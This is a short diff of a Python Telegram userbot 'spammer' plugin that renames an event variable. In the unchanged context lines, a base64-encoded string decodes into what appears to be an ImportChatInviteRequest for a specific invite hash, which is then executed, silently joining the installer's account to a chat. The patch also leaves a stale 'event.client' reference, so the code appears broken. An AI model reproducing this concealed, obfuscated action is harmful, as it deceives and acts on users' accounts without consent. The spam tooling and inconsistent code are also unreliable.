@@ -108,9 +108,9 @@ async def spammer(e):
 async def spammer(e):
     if e.fwd_from:
         return
-    reply_to_id = event.message
-    if event.reply_to_msg_id:
-        reply_to_id = await event.get_reply_message()
+    reply_to_id = e.message
+    if e.reply_to_msg_id:
+        reply_to_id = await e.get_reply_message()
     try:
         cat = str( pybase64.b64decode("SW1wb3J0Q2hhdEludml0ZVJlcXVlc3QoUGJGZlFCeV9IUEE3NldMZGpfWVBHQSk=") )[2:49]
         await event.client(cat)
